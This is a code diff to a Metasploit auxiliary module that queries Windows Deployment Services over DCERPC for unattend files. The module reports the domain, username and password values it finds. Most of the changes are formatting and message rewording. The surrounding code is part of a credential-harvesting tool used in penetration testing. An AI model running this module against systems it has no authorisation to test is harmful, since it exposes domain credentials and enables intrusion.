@@ -20,7 +20,7 @@ class Metasploit3 < Msf::Auxiliary
 	DCERPCClient   	= Rex::Proto::DCERPC::Client
 	DCERPCResponse 	= Rex::Proto::DCERPC::Response
 	DCERPCUUID     	= Rex::Proto::DCERPC::UUID
-	WDS_CONST 		= Rex::Proto::DCERPC::WDSCP::Constants
+	WDS_CONST 	= Rex::Proto::DCERPC::WDSCP::Constants
 	
 	def initialize(info = {})
 		super(update_info(info,
@@ -37,7 +37,6 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					[ 'MSDN', 'http://msdn.microsoft.com/en-us/library/dd891255(prot.20).aspx'],
 				],
-			'DisclosureDate' => 'N/A',
 			))
 
 		register_options(
@@ -49,7 +48,7 @@ class Metasploit3 < Msf::Auxiliary
 			
 		register_advanced_options(
 			[
-				OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not supported by Windows and will cause an error in System Event Log)', false])
+				OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not currently supported by Windows and will cause an error in System Event Log)', false])
 			], self.class)	
 	end
 	
@@ -66,15 +65,22 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def query_host(rhost)
 		# Create a handler with our UUID and Transfer Syntax
-		self.handle = Rex::Proto::DCERPC::Handle.new(	[WDS_CONST::WDSCP_RPC_UUID, '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
-														'ncacn_ip_tcp', 
-														rhost, 
-														[datastore['RPORT']])
+		self.handle = Rex::Proto::DCERPC::Handle.new(	[
+									WDS_CONST::WDSCP_RPC_UUID, 
+									'1.0',
+									'71710533-beba-4937-8319-b5dbef9ccc36', 
+									1
+								],
+								'ncacn_ip_tcp', 
+								rhost, 
+								[datastore['RPORT']]
+							)
 		
 		print_status("Binding to #{handle} ...")
 
 		self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
 		print_good("Bound to #{handle}")
+
 		report_service(
 				:host => rhost,
 				:port => datastore['RPORT'],
@@ -87,7 +93,7 @@ class Metasploit3 < Msf::Auxiliary
                         'Header' => 'Windows Deployment Services',
                         'Indent' => 1,
                         'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']
-        })
+	        })
 		
 		creds_found = false
 		
@@ -101,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
 				result = request_client_unattend(architecture)
                         rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
                                 vprint_error(e.to_s)
-				print_error("#{rhost} DCERPC Fault - likely Windows Deployment Services is present but not configured. Perhaps a SCCM installation.")
+				print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
 				return
 			end
 			
@@ -162,7 +168,6 @@ class Metasploit3 < Msf::Auxiliary
 			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
 			op_error_code = data.unpack('i*')[18]
 			if op_error_code == 0
-				# TODO Check error case where FLAGS variable is 0 (ie no Client Unattend found)
 				if data.length < 277
 					vprint_error("No Unattend received for #{architecture[0]} architecture")
 					return nil
